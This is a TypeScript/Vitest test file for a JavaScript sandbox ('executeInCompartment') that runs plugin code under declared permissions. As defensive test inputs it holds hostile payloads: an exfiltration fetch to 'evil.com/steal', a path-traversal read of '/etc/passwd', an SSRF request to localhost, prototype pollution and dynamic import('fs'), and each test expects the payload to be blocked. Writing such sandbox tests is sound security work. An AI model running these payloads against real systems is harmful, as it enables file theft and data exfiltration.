import { describe, expect, it, vi } from 'vitest'
import { executeInCompartment } from './compartment'

const mockLogger = {
  debug: vi.fn(),
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
}

vi.mock('../../logger', () => ({
  getLogger: () => mockLogger,
}))

describe('executeInCompartment', () => {
  it('runs async function code and returns result', async () => {
    const result = await executeInCompartment({
      code: 'async function(input) { return { doubled: input.n * 2 } }',
      input: { n: 21 },
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ doubled: 42 })
  })

  it('runs arrow function code', async () => {
    const result = await executeInCompartment({
      code: 'async (input) => ({ greeting: "hello " + input.name })',
      input: { name: 'world' },
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ greeting: 'hello world' })
  })

  it('passes input correctly', async () => {
    const result = await executeInCompartment({
      code: 'async function(input) { return input }',
      input: { a: 1, b: 'two', c: [3] },
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ a: 1, b: 'two', c: [3] })
  })

  it('denies access to process', async () => {
    const result = await executeInCompartment({
      code: 'async function() { return { type: typeof process } }',
      input: {},
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ type: 'undefined' })
  })

  it('denies access to require', async () => {
    const result = await executeInCompartment({
      code: 'async function() { return { type: typeof require } }',
      input: {},
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ type: 'undefined' })
  })

  it('denies access to fetch when not declared', async () => {
    const result = await executeInCompartment({
      code: 'async function() { return { type: typeof fetch } }',
      input: {},
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ type: 'undefined' })
  })

  it('serializes output across boundary (strips prototypes)', async () => {
    const result = await executeInCompartment({
      code: 'async function() { return { items: [1, 2, 3] } }',
      input: {},
      permissions: {},
      envVars: {},
    })
    // Result should be a plain object, not a compartment object
    expect(result).toEqual({ items: [1, 2, 3] })
    expect(Array.isArray((result as { items: number[] }).items)).toBe(true)
  })

  it('rejects oversized output', async () => {
    // Generate a string larger than 1MB
    const code = `async function() { return { data: "x".repeat(${1_048_577}) } }`
    await expect(
      executeInCompartment({ code, input: {}, permissions: {}, envVars: {} }),
    ).rejects.toThrow('Tool output exceeds maximum size')
  })

  it('rejects non-function code', async () => {
    await expect(
      executeInCompartment({ code: '42', input: {}, permissions: {}, envVars: {} }),
    ).rejects.toThrow('Tool code must evaluate to a function')
  })

  it('isolates state between invocations', async () => {
    // First invocation sets a global
    await executeInCompartment({
      code: 'async function() { globalThis.leaked = 42; return {} }',
      input: {},
      permissions: {},
      envVars: {},
    })

    // Second invocation should not see it
    const result = await executeInCompartment({
      code: 'async function() { return { type: typeof leaked } }',
      input: {},
      permissions: {},
      envVars: {},
    })
    expect(result).toEqual({ type: 'undefined' })
  })

  describe('time permission', () => {
    it('code with time permission can use Date.now()', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { now: Date.now() } }',
        input: {},
        permissions: { time: true },
        envVars: {},
      })
      expect(typeof (result as { now: number }).now).toBe('number')
    })

    it('code with time permission can use Intl.DateTimeFormat', async () => {
      const result = await executeInCompartment({
        code: `async function() {
          const fmt = new Intl.DateTimeFormat('en-US', { timeZone: 'UTC' })
          return { type: typeof fmt.format }
        }`,
        input: {},
        permissions: { time: true },
        envVars: {},
      })
      expect(result).toEqual({ type: 'function' })
    })

    it('Date.now() throws without time permission', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { return { now: Date.now() } }',
          input: {},
          permissions: {},
          envVars: {},
        }),
      ).rejects.toThrow()
    })

    it('Intl unavailable without time permission', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { type: typeof Intl } }',
        input: {},
        permissions: {},
        envVars: {},
      })
      expect(result).toEqual({ type: 'undefined' })
    })
  })

  describe('network permission', () => {
    it('endowed fetch is available to code', async () => {
      const mockFetch = vi.fn().mockResolvedValue(new Response(JSON.stringify({ ok: true })))
      vi.stubGlobal('fetch', mockFetch)

      const result = await executeInCompartment({
        code: `async function() {
          const res = await fetch("https://api.example.com/data")
          return res.json()
        }`,
        input: {},
        permissions: { network: ['api.example.com'] },
        envVars: {},
      })
      expect(result).toEqual({ ok: true })
      expect(mockFetch).toHaveBeenCalledOnce()

      vi.unstubAllGlobals()
    })
  })

  describe('env permission', () => {
    it('endowed env reader is available to code', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { key: env.get("API_KEY") } }',
        input: {},
        permissions: { env: ['API_KEY'] },
        envVars: { API_KEY: 'test-secret' },
      })
      expect(result).toEqual({ key: 'test-secret' })
    })

    it('env reader blocks undeclared keys', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { key: env.get("SECRET") } }',
        input: {},
        permissions: { env: ['API_KEY'] },
        envVars: { API_KEY: 'a', SECRET: 'b' },
      })
      expect(result).toEqual({ key: undefined })
    })
  })

  describe('random permission', () => {
    it('Math.random available with random permission', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { r: Math.random() } }',
        input: {},
        permissions: { random: true },
        envVars: {},
      })
      const r = (result as { r: number }).r
      expect(typeof r).toBe('number')
      expect(r).toBeGreaterThanOrEqual(0)
      expect(r).toBeLessThan(1)
    })

    it('Math.random unavailable without random permission', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { return { r: Math.random() } }',
          input: {},
          permissions: {},
          envVars: {},
        }),
      ).rejects.toThrow()
    })
  })

  describe('env permission denial', () => {
    it('env unavailable without env permission', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { type: typeof env } }',
        input: {},
        permissions: {},
        envVars: { SECRET: 'value' },
      })
      expect(result).toEqual({ type: 'undefined' })
    })
  })

  describe('fs permission denial', () => {
    it('readFile unavailable without fs permission', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { type: typeof readFile } }',
        input: {},
        permissions: {},
        envVars: {},
      })
      expect(result).toEqual({ type: 'undefined' })
    })

    it('path traversal blocked through executeInCompartment', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { return await readFile("/data/exports/../../etc/passwd") }',
          input: {},
          permissions: { fs: ['/data/exports'] },
          envVars: {},
        }),
      ).rejects.toThrow('Filesystem denied')
    })
  })

  describe('network security', () => {
    it('SSRF blocked end-to-end through executeInCompartment', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { return await fetch("https://localhost/internal") }',
          input: {},
          permissions: { network: ['localhost'] },
          envVars: {},
        }),
      ).rejects.toThrow('SSRF blocked')
    })

    it('fetch to undeclared host blocked end-to-end', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { return await fetch("https://evil.com/steal") }',
          input: {},
          permissions: { network: ['api.example.com'] },
          envVars: {},
        }),
      ).rejects.toThrow('Network denied')
    })
  })

  describe('console', () => {
    it('routes console.log through the structured logger', async () => {
      mockLogger.debug.mockClear()

      await executeInCompartment({
        code: 'async function() { console.log("from sandbox"); return {} }',
        input: {},
        permissions: {},
        envVars: {},
      })
      expect(mockLogger.debug).toHaveBeenCalledWith('from sandbox', {
        plugin: 'plugin:sandbox',
      })
    })
  })

  describe('security edge cases', () => {
    it('prototype pollution blocked', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { Object.prototype.polluted = true; return {} }',
          input: {},
          permissions: {},
          envVars: {},
        }),
      ).rejects.toThrow()
    })

    it('dynamic import() blocked', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { await import("fs"); return {} }',
          input: {},
          permissions: {},
          envVars: {},
        }),
      ).rejects.toThrow()
    })

    it('host globals inaccessible', async () => {
      const result = await executeInCompartment({
        code: `async function() {
          return {
            Bun: typeof Bun,
            setTimeout: typeof setTimeout,
            setInterval: typeof setInterval,
            queueMicrotask: typeof queueMicrotask,
          }
        }`,
        input: {},
        permissions: {},
        envVars: {},
      })
      expect(result).toEqual({
        Bun: 'undefined',
        setTimeout: 'undefined',
        setInterval: 'undefined',
        queueMicrotask: 'undefined',
      })
    })

    it('tool error propagates without leaking compartment internals', async () => {
      try {
        await executeInCompartment({
          code: 'async function() { throw new Error("tool failed") }',
          input: {},
          permissions: {},
          envVars: {},
        })
        expect.unreachable('should have thrown')
      } catch (err) {
        expect(err).toBeInstanceOf(Error)
        expect((err as Error).message).toBe('tool failed')
      }
    })

    it('function in output is stripped by JSON serialization', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return { a: 1, fn: function() {} } }',
        input: {},
        permissions: {},
        envVars: {},
      })
      // JSON.stringify drops function values — the key is omitted
      expect(result).toEqual({ a: 1 })
    })

    it('circular reference in output throws', async () => {
      await expect(
        executeInCompartment({
          code: 'async function() { const o = {}; o.self = o; return o }',
          input: {},
          permissions: {},
          envVars: {},
        }),
      ).rejects.toThrow()
    })

    it('undefined output serializes to null', async () => {
      const result = await executeInCompartment({
        code: 'async function() { return undefined }',
        input: {},
        permissions: {},
        envVars: {},
      })
      // JSON.stringify(undefined) returns undefined, JSON.parse(undefined) throws
      // Actually JSON.stringify(undefined) -> undefined -> JSON.parse throws
      // Let's see what actually happens
      expect(result).toBeNull()
    })
  })
})
